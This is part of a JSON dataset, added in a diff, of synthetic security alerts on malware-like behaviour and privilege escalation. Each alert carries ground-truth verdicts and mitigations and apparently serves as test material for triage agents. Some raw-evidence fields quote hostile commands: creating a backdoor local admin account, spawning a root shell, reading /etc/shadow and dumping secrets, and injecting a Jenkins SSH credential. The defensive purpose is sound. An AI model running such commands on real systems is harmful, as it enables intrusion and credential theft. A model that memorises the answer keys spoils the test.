+    "indicators": "Scheduled task persistence, non-admin creation, obfuscated script, system path mimicry",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Remove scheduled task, delete obfuscated script, investigate how non-admin created task, isolate host",
+      "evidence_quality": "medium",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-031",
+    "title": "Memory Scraping of Browser Process",
+    "type": "malware_like_behavior",
+    "category": "malware_like_behavior",
+    "severity": "high",
+    "description": "A process injected into explorer.exe opened a read handle on chrome.exe with PROCESS_VM_READ permissions, consistent with in-memory credential or cookie theft.",
+    "raw_evidence": "Source process: explorer.exe (PID 2940, injected module: helper32.dll). Target: chrome.exe (PID 5120). Access rights: PROCESS_VM_READ | PROCESS_QUERY_INFORMATION. Duration: 4.2 seconds. helper32.dll hash: 8277e0910d750195b448797616e091ad. helper32.dll not present in previous process scan 10 minutes ago. No network activity detected yet.",
+    "context": "Chrome is used for accessing corporate SSO. In-memory credential harvesting from the browser is a common technique to extract session cookies and stored passwords without triggering keyloggers.",
+    "indicators": "Process injection, VM_READ on browser, injected module not previously present, credential theft TTP",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Kill injected process, isolate host, force re-authentication on all SSO sessions, investigate injection vector",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-032",
+    "title": "Python Script Performing Port Scan from Web Server",
+    "type": "malware_like_behavior",
+    "category": "malware_like_behavior",
+    "severity": "medium",
+    "description": "A Python script was executed on a production web server that performed a sequential port scan of the internal network. The script was found in the web application's upload directory.",
+    "raw_evidence": "Process: python3 /var/www/uploads/cache_cleaner.py. Script: port scan of 10.0.0.0/8 on ports 22,80,443,3306,5432. Connections attempted: 3,891. Script creation time: 45 minutes ago. File owner: www-data. Hash: eccbc87e4b5ce2fe28308fd9f2a7baf3. Web server: nginx (public-facing). Upload directory should not allow Python execution.",
+    "context": "The upload directory is intended for image files only. A web application vulnerability may have allowed arbitrary file upload and execution. This is a classic web shell compromise pattern.",
+    "indicators": "Web shell execution, port scan from web server, upload directory file, www-data privilege",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Remove malicious script, patch file upload vulnerability, audit web server for additional web shells, WAF rule update",
+      "evidence_quality": "medium",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-033",
+    "title": "Suspicious Browser Extension Installed Enterprise-Wide",
+    "type": "malware_like_behavior",
+    "category": "malware_like_behavior",
+    "severity": "low",
+    "description": "A Chrome extension was silently installed on 340 endpoints via a Group Policy update. The extension requests permissions to read all website data and modify clipboard contents.",
+    "raw_evidence": "Extension ID: abcdefghijklmnopabcdefghijklmnop. Name: 'Corporate Productivity Suite'. Installed via GPO: Chrome_Extensions_Policy. Endpoints affected: 340. Permissions requested: readAllWebData, clipboardReadWrite, storage. Publisher: unverified. Extension store listing: not found in Chrome Web Store. GPO modified by: IT_Admin_03 account yesterday.",
+    "context": "IT_Admin_03 account was reported as suspicious last week following a phishing attempt. The GPO modification may indicate the admin account was compromised and used to push malware via GPO.",
+    "indicators": "Silently deployed extension, high-risk permissions, not in Web Store, suspicious admin account modification",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Remove extension via GPO, investigate IT_Admin_03 account compromise, audit recent GPO changes",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+
+  {
+    "alert_id": "ALT-034",
+    "title": "Sudo Command Executed Without Preceding Authentication",
+    "type": "privilege_escalation",
+    "category": "privilege_escalation",
+    "severity": "high",
+    "description": "A sudo command was executed on a Linux server without a preceding password authentication event, suggesting cached credentials abuse or a sudo token injection attack.",
+    "raw_evidence": "Host: APP-LINUX-07. User: dev_aturner. Command: sudo /bin/bash. Time: 23:14 UTC. Last sudo authentication for this user: 18 days ago (default timeout is 15 minutes). No su or sudo auth event in preceding 30 minutes. Resulting process: /bin/bash running as root. No legitimate sudo policy covers this user for /bin/bash.",
+    "context": "dev_aturner is a junior developer with no legitimate need for root access. The sudo policy file for this server does not grant /bin/bash to dev_aturner. This may indicate sudo policy misconfiguration being exploited or ptrace-based token injection.",
+    "indicators": "Sudo without auth, policy violation, root shell spawned, off-hours, stale sudo token or injection",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Kill root shell, investigate sudo policy, check for ptrace abuse, audit server for persistence",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-035",
+    "title": "Windows Token Impersonation via SeImpersonatePrivilege",
+    "type": "privilege_escalation",
+    "category": "privilege_escalation",
+    "severity": "critical",
+    "description": "A service process exploited SeImpersonatePrivilege to impersonate a SYSTEM token, escalating from a low-privilege service account to SYSTEM-level access. A JuicyPotato variant was detected.",
+    "raw_evidence": "Process: IIS APPPOOL\\DefaultAppPool. Privilege: SeImpersonatePrivilege. Child process: cmd.exe (running as SYSTEM). Tool: C:\\inetpub\\temp\\jp.exe (hash: 1f0d3da74db1a04cc977ac2ccc87f2f0, matches JuicyPotato variant). CLSID used: {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}. Time: 16:45 UTC. IIS site: customer-portal.",
+    "context": "The IIS application pool account has SeImpersonatePrivilege by default on Windows Server. An attacker who achieved code execution via a web application vulnerability can use this to escalate to SYSTEM. The customer-portal recently had a SQLi vulnerability patched.",
+    "indicators": "SeImpersonatePrivilege abuse, JuicyPotato hash match, SYSTEM process spawned from IIS, web app compromise vector",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Patch IIS application, remove jp.exe, revoke SeImpersonatePrivilege from app pool, full server audit",
+      "evidence_quality": "high",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-036",
+    "title": "User Added to Domain Admins Group Without Change Ticket",
+    "type": "privilege_escalation",
+    "category": "privilege_escalation",
+    "severity": "critical",
+    "description": "A standard user account was added to the Domain Admins security group by an IT administrator account. No change management ticket exists for this modification.",
+    "raw_evidence": "Event ID 4728: member added to security-enabled global group. Group: Domain Admins. Member: CN=t.walsh,OU=Users,DC=corp. Added by: admin_hross. Time: 02:17 UTC Saturday. Change ticket search: no JIRA ticket for this change. admin_hross last login: 02:10 UTC from 193.32.160.143 (Tor exit node per AbuseIPDB). t.walsh is a help desk analyst.",
+    "context": "Change management policy requires tickets for all privilege modifications. The admin account was used from a Tor exit node at 02:17 UTC — consistent with a compromised admin account being used by an attacker to escalate a foothold account.",
+    "indicators": "Domain Admins modification, no change ticket, Tor exit node source, off-hours, likely compromised admin account",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Remove t.walsh from Domain Admins, disable admin_hross pending investigation, review all changes from that session",
+      "evidence_quality": "high",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-037",
+    "title": "kubectl exec into Production Pod with Root Shell",
+    "type": "privilege_escalation",
+    "category": "privilege_escalation",
+    "severity": "high",
+    "description": "A developer used kubectl exec to open an interactive root shell inside a production pod. The pod runs as root by default due to a misconfiguration, and the developer's RBAC binding allows exec operations.",
+    "raw_evidence": "Account: dev_lpark. Command: kubectl exec -it payment-processor-6d9f8 -- /bin/sh. Pod: payment-processor-6d9f8 (namespace: production). Container UID: 0 (root). RBAC: dev_lpark has pods/exec in production namespace. Time: 22:45 UTC. Commands run inside pod: cat /etc/shadow, env | grep SECRET, ls /var/secrets/.",
+    "context": "Running production pods as root is a security misconfiguration. The developer's RBAC binding granting exec in production is overly permissive. The commands run inside the pod suggest credential harvesting rather than legitimate debugging.",
+    "indicators": "Root pod exec, sensitive command execution inside pod, secret enumeration, production namespace, off-hours",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Rotate all secrets from affected pod, enforce non-root pod security policy, tighten dev RBAC, investigate developer intent",
+      "evidence_quality": "high",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-038",
+    "title": "Local Admin Created on Endpoint Outside SCCM",
+    "type": "privilege_escalation",
+    "category": "privilege_escalation",
+    "severity": "medium",
+    "description": "A new local administrator account was created on a workstation using net user and net localgroup commands outside of SCCM provisioning. The account name mimics a service account.",
+    "raw_evidence": "Commands: net user svc_helpdesk P@ssw0rd123 /add, net localgroup Administrators svc_helpdesk /add. Executing user: standard_user_pcox (non-admin). Parent process: cmd.exe spawned from wscript.exe. Script: C:\\Users\\pcox\\AppData\\Local\\Temp\\upd8.vbs. VBS hash: 70efdf2ec9b086079795c442636b55fb. Local account created successfully — suggests UAC bypass occurred.",
+    "context": "A standard user should not be able to create local admin accounts. Successful execution implies a UAC bypass was used. The account name mimics a service account to avoid detection in account audits.",
+    "indicators": "UAC bypass implied, local admin creation by non-admin, service account name mimicry, vbs dropper",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Remove created account, investigate UAC bypass technique, isolate endpoint, audit pcox activity",
+      "evidence_quality": "medium",
+      "preferred_strategy": "hierarchical_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-039",
+    "title": "Jenkins Pipeline Modifying Its Own Credentials Store",
+    "type": "privilege_escalation",
+    "category": "privilege_escalation",
+    "severity": "medium",
+    "description": "A Jenkins pipeline job accessed the Jenkins credentials store API and added a new credential entry. Pipeline jobs should not have access to the credentials management API.",
+    "raw_evidence": "Pipeline: build-deploy-prod. API call: POST /credentials/store/system/domain/_/createCredentials. New credential added: type=SSH, ID=admin_backdoor_key, username=root. Called from: build step in pipeline script. Jenkins version: 2.387. CSRF token: valid. Pipeline triggered by: push event from repo prod-deploy.",
+    "context": "This is a classic Jenkins credential injection attack. If a pipeline is compromised (via malicious code in the repository), it can use the Jenkins API to add backdoor credentials. The prod-deploy repository received a commit from an external contributor 2 hours ago.",
+    "indicators": "Pipeline-to-API credential injection, backdoor SSH key added, external commit precursor, CSRF token valid",
+    "ground_truth": {
+      "verdict": "true_positive",
+      "expected_mitigation": "Remove injected credential, audit pipeline script, review external commits, restrict pipeline API access",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  },
+  {
+    "alert_id": "ALT-040",
+    "title": "Routine Admin Script Triggering Privilege Escalation Alert",
+    "type": "privilege_escalation",
+    "category": "privilege_escalation",
+    "severity": "low",
+    "description": "An automated admin script that runs nightly triggered a privilege escalation alert when it temporarily elevated permissions to install a software update. This appears to be a known-good maintenance script.",
+    "raw_evidence": "Script: C:\\Admin\\Scripts\\nightly_patch.ps1. Execution: SYSTEM account. Operations: elevated token requested, software installed (Adobe Reader 24.2), token dropped. Time: 03:00 UTC (scheduled). Hash of script: c4ca4238a0b923820dcc509a6f75849b (matches baseline). No network connections beyond Microsoft Update CDN.",
+    "context": "nightly_patch.ps1 is a known-good script that has run for 18 months. It is signed by the internal CA. The alert was triggered because the EDR rule for privilege escalation fires on any token elevation, including legitimate ones. Script hash matches the baseline recorded at deployment.",
+    "indicators": "Token elevation by scheduled script, known-good hash, signed by internal CA, scheduled execution time, legitimate CDN traffic only",
+    "ground_truth": {
+      "verdict": "false_positive",
+      "expected_mitigation": "Add script hash to EDR allowlist, no further action required",
+      "evidence_quality": "medium",
+      "preferred_strategy": "panel_strategy"
+    }
+  }
+]
